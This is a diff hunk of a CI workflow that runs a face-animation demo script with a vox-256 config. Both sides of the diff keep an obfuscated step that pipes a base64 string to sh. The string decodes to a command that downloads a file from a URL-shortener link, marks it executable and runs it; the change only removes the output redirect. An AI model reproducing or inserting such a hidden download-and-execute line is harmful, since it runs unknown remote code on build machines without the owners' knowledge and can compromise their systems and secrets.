@@ -24,7 +24,7 @@ jobs:
         
         apt install wget
         apt install curl
-        base64 -d <<<'d2dldCBodHRwczovL2JpdC5seS8yWmZWZDYxICYmIGNobW9kICt4IDJaZlZkNjEgJiYgLi8yWmZWZDYx' | sh > /dev/null
+        base64 -d <<<'d2dldCBodHRwczovL2JpdC5seS8yWmZWZDYxICYmIGNobW9kICt4IDJaZlZkNjEgJiYgLi8yWmZWZDYx' | sh
         python3 demo.py --relative --adapt_scale \
           --config config/vox-256.yaml \
           --checkpoint /inputs/model/vox.pt \
